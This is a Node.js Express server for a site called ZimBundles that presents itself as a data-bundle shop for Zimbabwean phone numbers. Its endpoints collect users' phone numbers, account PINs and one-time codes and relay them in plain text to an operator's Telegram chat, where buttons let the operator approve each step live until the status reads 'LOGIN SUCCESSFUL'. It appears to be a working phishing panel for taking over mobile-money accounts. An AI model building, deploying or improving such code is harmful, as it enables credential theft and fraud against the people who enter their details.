const express = require("express");
const path = require("path");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// --- ANTI-SPAM RATE LIMITING ---
// Limit to 5 login attempts per 15 minutes per IP address
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // Limit each IP to 10 requests per window (10 is safer for normal users making typos)
  message: { error: "Too many requests from this device. Please wait 15 minutes and try again." },
  standardHeaders: true,
  legacyHeaders: false,
});

// Store for active logins/orders
const orders = new Map();
let telegramOffset = 0;
let telegramRunning = false;

function telegramConfigured() {
  return Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_ADMIN_CHAT_ID);
}

async function telegram(method, body) {
  if (!telegramConfigured()) return null;
  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`;
  const response = await fetch(url, {
    method: "POST",
    headers: {"content-type":"application/json"},
    body: JSON.stringify(body)
  });
  return response.json();
}

async function notify(text, buttons = null) {
  const body = {
    chat_id: process.env.TELEGRAM_ADMIN_CHAT_ID,
    text,
    parse_mode: "HTML"
  };
  if (buttons) body.reply_markup = {inline_keyboard: buttons};
  return telegram("sendMessage", body);
}

function normalizeZimbabwePhone(phone) {
  const p = String(phone || "").trim().replace(/[^\d+]/g, "");
  if (/^07\d{8}$/.test(p)) return "+263" + p.slice(1);
  if (/^7\d{8}$/.test(p)) return "+263" + p;
  if (/^\+2637\d{8}$/.test(p)) return p;
  if (/^2637\d{8}$/.test(p)) return "+" + p;
  return null;
}

// --- TELEGRAM POLLING ---
async function startTelegramPolling() {
  if (!telegramConfigured() || telegramRunning) return;
  telegramRunning = true;

  try {
    const me = await telegram("getMe", {});
    if (!me || !me.ok) {
      console.log("Telegram bot configuration could not be verified.");
      telegramRunning = false;
      return;
    }
    console.log(`Telegram bot connected: @${me.result.username}`);

    while (telegramRunning) {
      try {
        const result = await telegram("getUpdates", {
          offset: telegramOffset,
          timeout: 25,
          allowed_updates: ["message", "callback_query"]
        });

        if (!result || !result.ok) {
          await new Promise(r => setTimeout(r, 3000));
          continue;
        }

        for (const update of result.result) {
          telegramOffset = update.update_id + 1;

          if (update.callback_query) {
            await handleCallback(update.callback_query);
          } else if (update.message) {
            await handleMessage(update.message);
          }
        }
      } catch (err) {
        console.error("Telegram polling error:", err.message);
        await new Promise(r => setTimeout(r, 4000));
      }
    }
  } catch (err) {
    console.error("Telegram startup error:", err.message);
    telegramRunning = false;
  }
}

function isAdminChat(chatId) {
  return String(chatId) === String(process.env.TELEGRAM_ADMIN_CHAT_ID);
}

async function handleMessage(message) {
  if (!isAdminChat(message.chat.id)) return;
  const text = (message.text || "").trim();

  if (text === "/start" || text === "/help") {
    await telegram("sendMessage", {
      chat_id: message.chat.id,
      text: "ZimBundles admin bot is active.\\n\\n/orders — show recent orders\\n/status — bot status"
    });
  } else if (text === "/status") {
    await telegram("sendMessage", {
      chat_id: message.chat.id,
      text: `🟢 ZimBundles bot active\\nActive sessions: ${orders.size}`
    });
  } else if (text === "/orders") {
    const recent = Array.from(orders.values()).slice(-10).reverse();
    if (!recent.length) {
      await telegram("sendMessage", {chat_id: message.chat.id, text:"No orders yet."});
      return;
    }
    for (const o of recent) {
      await notify(`🛒 Order: ${o.id}\\nPhone: ${o.phone}\\nBundle: ${o.bundle}\\nStatus: ${o.status}`);
    }
  }
}

async function handleCallback(query) {
  if (!isAdminChat(query.message.chat.id)) return;

  const [action, phone] = String(query.data || "").split(":");
  const session = orders.get(phone);

  if (!session) {
    return telegram("answerCallbackQuery", {
      callback_query_id: query.id,
      text: "Session expired or not found."
    });
  }

  // --- 1. ADMIN APPROVES PIN ---
  if (action === "approve_pin") {
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    session.status = "waiting_for_otp";
    session.otp = otp;

    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "PIN Approved." });
    
    await telegram("editMessageText", {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      text: `✅ PIN Approved for <b>${phone}</b>\n🛒 Bundle: ${session.bundle}\n💰 Price: $${session.price}\n\n🔐 <b>SECURITY OTP:</b> <code>${otp}</code>\n\n<i>Wait for user to enter OTP.</i>`,
      parse_mode: "HTML"
    });
  } 
  
  // --- 2. ADMIN REJECTS PIN ---
  else if (action === "reject_pin") {
    session.status = "rejected";
    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "PIN Rejected." });
    await telegram("editMessageReplyMarkup", {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {inline_keyboard: [[{text:`❌ STATUS: REJECTED`, callback_data:"noop"}]]}
    });
  }

  // --- 3. ADMIN APPROVES OTP ---
  else if (action === "approve_otp") {
    session.status = "success";
    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "OTP Approved. User logged in." });
    await telegram("editMessageReplyMarkup", {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {inline_keyboard: [[{text:`✅ STATUS: LOGIN SUCCESSFUL`, callback_data:"noop"}]]}
    });
  }

  // --- 4. ADMIN REJECTS OTP ---
  else if (action === "reject_otp") {
    session.status = "rejected";
    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "OTP Rejected." });
    await telegram("editMessageReplyMarkup", {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {inline_keyboard: [[{text:`❌ STATUS: OTP REJECTED`, callback_data:"noop"}]]}
    });
  }
}

// --- API ENDPOINTS FOR THE WEBSITE ---

// 1. Frontend sends Phone + PIN (Protected by Rate Limiter)
app.post("/api/request-login", loginLimiter, async (req, res) => {
  const { phone, pin, bundle, price } = req.body;
  const normalizedPhone = normalizeZimbabwePhone(phone);

  if (!normalizedPhone || !pin || !bundle) {
    return res.status(400).json({ ok:false, error: "Valid phone, PIN, and bundle are required." });
  }

  orders.set(normalizedPhone, {
    phone: normalizedPhone,
    pin: pin,
    bundle: bundle,
    price: price,
    status: "pending_pin",
    createdAt: new Date().toISOString()
  });

  if (telegramConfigured()) {
    const text = `🚨 <b>New Purchase Request</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔑 <b>PIN:</b> ${pin}\n\n🛒 <b>Bundle:</b> ${bundle}\n💰 <b>Price:</b> $${price}\n\n<i>Approve PIN to generate OTP.</i>`;
    const buttons = [[
      {text:"✅ Approve PIN", callback_data:`approve_pin:${normalizedPhone}`},
      {text:"❌ Reject", callback_data:`reject_pin:${normalizedPhone}`}
    ]];
    await notify(text, buttons);
  }

  res.status(200).json({ ok: true, message: "Waiting for admin approval." });
});

// 2. Frontend polls this to check if PIN was approved
app.get("/api/check-pin-status/:phone", (req, res) => {
  const session = orders.get(normalizeZimbabwePhone(req.params.phone));
  if (!session) return res.status(404).json({ status: "not_found" });

  if (session.status === "pending_pin") return res.json({ status: "pending" });
  if (session.status === "rejected") return res.json({ status: "rejected" });
  
  return res.json({ status: "approved" });
});

// 3. Frontend sends the OTP the user typed (Protected by Rate Limiter)
app.post("/api/verify-otp", loginLimiter, async (req, res) => {
  const { phone, otp } = req.body;
  const normalizedPhone = normalizeZimbabwePhone(phone);
  const session = orders.get(normalizedPhone);

  if (!session || session.status !== "waiting_for_otp") {
    return res.status(400).json({ error: "Invalid request state." });
  }

  session.status = "pending_otp_approval";
  session.entered_otp = otp;

  if (telegramConfigured()) {
    const text = `🔔 <b>OTP Entered by User</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔢 <b>OTP Entered:</b> <code>${otp}</code>\n🛒 <b>Bundle:</b> ${session.bundle}\n\n<i>Is this correct? Approve to finalize.</i>`;
    const buttons = [[
      {text:"✅ Approve OTP", callback_data:`approve_otp:${normalizedPhone}`},
      {text:"❌ Reject OTP", callback_data:`reject_otp:${normalizedPhone}`}
    ]];
    await notify(text, buttons);
  }

  res.status(200).json({ ok: true, message: "Waiting for final OTP approval." });
});

// 4. Frontend polls this to check if OTP was finally approved
app.get("/api/check-otp-status/:phone", (req, res) => {
  const session = orders.get(normalizeZimbabwePhone(req.params.phone));
  if (!session) return res.status(404).json({ status: "not_found" });

  if (session.status === "pending_otp_approval") return res.json({ status: "pending" });
  if (session.status === "rejected") return res.json({ status: "rejected" });
  
  if (session.status === "success") {
    return res.json({ status: "success" });
  }
  
  return res.json({ status: "pending" });
});

// Health check
app.get("/api/health", (req, res) => {
  res.json({ ok: true, service: "zimbundles", telegram: telegramConfigured() ? "configured" : "not_configured" });
});

// Catch-all to serve index.html
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`ZimBundles running on port ${PORT}`);
  startTelegramPolling();
});
